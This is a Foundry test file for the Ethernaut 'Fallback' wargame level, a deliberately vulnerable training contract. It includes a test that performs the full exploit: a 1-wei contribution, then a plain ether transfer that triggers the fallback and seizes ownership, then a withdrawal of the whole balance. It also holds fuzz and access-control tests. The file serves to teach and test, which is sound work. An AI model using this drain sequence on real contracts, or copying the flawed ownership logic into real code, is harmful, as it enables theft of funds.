// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import "forge-std/Test.sol";
import {EthernautFallback} from "../../src/ethernaut/Fallback.sol";

contract FallbackTest is Test {
    EthernautFallback level;
    address player = makeAddr("player");

    function setUp() public {
        level = new EthernautFallback{value: 1 ether}();
        vm.deal(player, 1 ether);
    }

    function testFuzz_ContributionLimit(uint256 seed) public {
        uint256 amount = 0.001 ether + (seed % (1 ether - 0.001 ether + 1));
        vm.prank(player);
        vm.expectRevert("Contribution too large");
        level.contribute{value: amount}();
    }

    function testFallbackExploit() public {
        vm.startPrank(player);
        level.contribute{value: 1 wei}();
        (bool ok,) = address(level).call{value: 1 wei}("");
        require(ok, "fallback call failed");
        level.withdraw();
        vm.stopPrank();

        assertEq(level.owner(), player);
        assertEq(address(level).balance, 0);
    }
}

contract FallbackTestWithoutExploit is Test {
    EthernautFallback level;
    address player = makeAddr("player");

    function setUp() public {
        level = new EthernautFallback{value: 1 ether}();
        vm.deal(player, 1 ether);
    }

    function testDirectWithdrawBlocked() public {
        vm.prank(player);
        vm.expectRevert("Not owner");
        level.withdraw();
    }
}

